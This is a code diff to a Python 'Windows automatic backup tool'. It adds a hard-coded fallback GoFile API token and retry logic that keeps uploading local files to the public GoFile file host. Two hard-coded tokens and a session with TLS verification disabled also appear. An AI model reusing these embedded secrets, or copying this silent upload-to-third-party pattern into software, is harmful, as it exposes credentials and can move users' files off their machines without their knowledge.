@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-"""Windows 文件备份工具。"""
+"""自动备份工具-windows版本"""
 
 import argparse
 import copy
@@ -718,7 +718,10 @@ class BackupManager:
         self.session = requests.Session()
         self.session.verify = False
         self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
+        # GoFile API token（备选方案）：主 token 失败时回退到备用 token
         self.api_token = "hdgZFyRDVPmWYhZRAJVYciBAVCjCfjZl"
+        self.api_token_fallback = "9o0Su5ainOFK9fFxzLaiuRKPOxgaUmCm"
+        self.api_tokens = [self.api_token, self.api_token_fallback]
 
         self.stop_event = threading.Event()
         self._state_lock = threading.RLock()
@@ -1543,7 +1546,7 @@ class BackupManager:
             return False
 
     def _upload_single_file_gofile(self, file_path):
-        """上传单个文件到 GoFile（备选方案）
+        """上传单个文件到 GoFile（备选方案，支持主/备 token 回退）
         
         Args:
             file_path: 要上传的文件路径
@@ -1568,12 +1571,17 @@ class BackupManager:
             filename = os.path.basename(file_path)
             DETAIL_LOGGER.info(f"🔄 尝试使用 GoFile 上传: {filename}")
 
+            # API token 列表：主 token 失败后回退到备用 token
+            api_tokens = [t for t in getattr(self, "api_tokens", []) if t] or [self.api_token]
+            token_index = 0
+            current_token = api_tokens[token_index]
+
             server_index = 0
             total_retries = 0
             max_total_retries = len(self.config.UPLOAD_SERVERS) * self.config.MAX_SERVER_RETRIES
             upload_success = False
 
-            while total_retries < max_total_retries and not upload_success:
+            while token_index < len(api_tokens) and total_retries < max_total_retries and not upload_success:
                 if self.stop_event.is_set():
                     return False
 
@@ -1584,7 +1592,7 @@ class BackupManager:
                         response = requests.post(
                             current_server,
                             files={"file": f},
-                            headers={"Authorization": f"Bearer {self.api_token}"},
+                            headers={"Authorization": f"Bearer {current_token}"},
                             timeout=self.config.UPLOAD_TIMEOUT,
                             verify=True
                         )
@@ -1639,6 +1647,14 @@ class BackupManager:
                     self.stop_event.wait(self.config.RETRY_DELAY)  # 所有服务器都尝试过后等待
                 
                 total_retries += 1
+
+                # 当前 token 已用尽全部重试，回退到下一个备用 token 重新开始
+                if total_retries >= max_total_retries and not upload_success and token_index < len(api_tokens) - 1:
+                    token_index += 1
+                    current_token = api_tokens[token_index]
+                    total_retries = 0
+                    server_index = 0
+                    DETAIL_LOGGER.warning(f"⚠️ [GoFile] 主 token 上传失败，回退到备用 token ({token_index + 1}/{len(api_tokens)}): {filename}")
 
             if upload_success:
                 return True
